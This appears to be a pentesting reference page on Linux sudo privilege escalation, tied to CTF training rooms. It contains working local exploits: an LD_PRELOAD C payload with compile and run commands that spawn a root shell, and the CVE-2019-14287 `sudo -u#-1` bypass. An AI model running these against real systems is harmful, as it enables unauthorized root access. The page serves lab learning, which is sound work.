# sudo privilege escalation

*An excellent reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) (2.0k ⭐)*

[![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![picklerick](../../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
[![linprivesc](../../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
[![wgelctf](../../../_badges/thm-p/wgelctf.svg)](https://tryhackme.com/room/wgelctf)
[![easyctf](../../../_badges/thm-p/easyctf.svg)](https://tryhackme.com/room/easyctf)
[![colddboxeasy](../../../_badges/thm-p/colddboxeasy.svg)](https://tryhackme.com/room/colddboxeasy)
[![allinonemj](../../../_badges/thm-p/allinonemj.svg)](https://tryhackme.com/room/allinonemj)
[![chillhack](../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
![nibbles](../../../_badges/htb-p/nibbles.svg)
![getsimplecms](../../../_badges/htb-p/getsimplecms.svg)

<div class="row row-cols-lg-2"><div>

If you have [administrative privileges](/operating-systems/linux/_knowledge/index.md#sudo), you can list them with:

```ps
$ sudo -nl # without a password
$ sudo -l # with a password
```

The first section is about settings and environment variables that may be exploited such as [LD_PRELOAD](#ldpreload).

```text!
Matching Defaults entries for [...]:
    [...] # something here
```
</div><div>

The second section is about your [sudoers](/operating-systems/linux/env/files/index.md#etcsudoers) rights. Such commands may be exploited to get root, search the command on [GTOBins #sudo](gtfobins.md).

```text!
User [...] may run the following commands on [...]:
    (root) /bin/tar
    (root) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/vim
    (xxx) NOPASSWD: /opt/script.sh
```

➡️ For instance, the user below can run `/bin/tar` as `root`. 

📚 Sometimes, instead of root, we may be able to run commands as another user, such as `/opt/script.sh` as user `xxx`. Use `sudo -u xxx`.
</div></div>

<hr class="sep-both">

## LD_PRELOAD

[![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)

<div class="row row-cols-lg-2"><div>

If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l`, then it means that the user can run some code before executing a command as administrator.

The code below replace the gid/uid of the user running the command with `0` <small>(root)</small>. Then, it pops a bash shell <small>(as root!)</small>.

```c
void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
</div><div>

Compile it with

```
$ cd /tmp
$ gcc -shared -fPIC init.c -o init.so
```

Then, call the command that you could run as administrator <small>(`tar` here)</small>, while setting the variable path to your script:

```bash!
$ sudo LD_PRELOAD=/tmp/init.so tar
```

💎 Congratulations, you are `root` now!
</div></div>

<hr class="sep-both">

## Well-known Vulnerabilities

<div class="row row-cols-lg-2"><div>

#### sudo before 1.8.28 (CVE-2019-14287)

[![agentsudoctf](../../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)

If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.

```ps
$ sudo -u#-1 tar [...]
$ sudo -u#4294967295 tar [...]
```

💎 Congratulations, you are `root` now!
</div><div>

#### sudo before 1.9.5p2 (CVE-2021-3156)

[![metasploitframework](../../../_badges/htb/metasploitframework.svg)](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework)

See metasploit module: `exploit/linux/local/sudo_baron_samedit`.
</div></div>